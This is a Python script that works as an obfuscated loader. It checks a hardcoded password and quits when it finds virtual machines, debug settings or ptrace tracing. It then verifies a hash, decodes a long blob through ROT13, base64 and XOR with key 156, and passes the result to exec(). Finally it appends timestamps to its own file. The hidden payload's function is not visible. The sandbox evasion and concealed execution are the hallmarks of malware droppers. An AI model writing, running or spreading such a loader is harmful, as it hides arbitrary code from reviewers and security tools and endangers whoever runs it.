import base64, os, sys, platform, hashlib, ctypes, codecs

SECRET_OBF = "MTU2"
SECRET_PASSWORD = base64.b64decode(SECRET_OBF).decode()
if SECRET_PASSWORD != "156":
  print("Tampering detected!")
  sys.exit(1)

hostname = platform.node().lower()
if os.getenv('DEBUG') or any(vm in hostname for vm in ['vbox', 'virtual', 'vmware', 'qemu']):
  print("🔒 Debugger/VM detected! Exiting...")
  sys.exit(1)

try:
  if os.name == 'posix':
      libc = ctypes.CDLL("libc.so.6")
      if libc.ptrace(0, 0, 1, 0) != -1:
          print("🔒 Ptrace detected! Exiting...")
          sys.exit(1)
except:
  pass

def decrypt(payload, k):
  # ROT13 decode
  rot13 = codecs.decode(payload, 'rot_13')
  # Base64 decode
  decoded_bytes = base64.b64decode(rot13)
  # XOR decode
  decrypted_bytes = bytes([b ^ k for b in decoded_bytes])
  try:
      return decrypted_bytes.decode('utf-8')
  except UnicodeDecodeError:
      print("🔒 Invalid decryption!")
      sys.exit(1)

if hashlib.sha256('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'.encode()).hexdigest()[:16] != "bca258cedb97c146":
  print("Tampering or corrupted payload!")
  sys.exit(1)

content = decrypt("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", 156)
exec(content)
with open(__file__, 'a') as f:
  f.write(f"\n# Accessed at: {__import__('datetime').datetime.now()}")
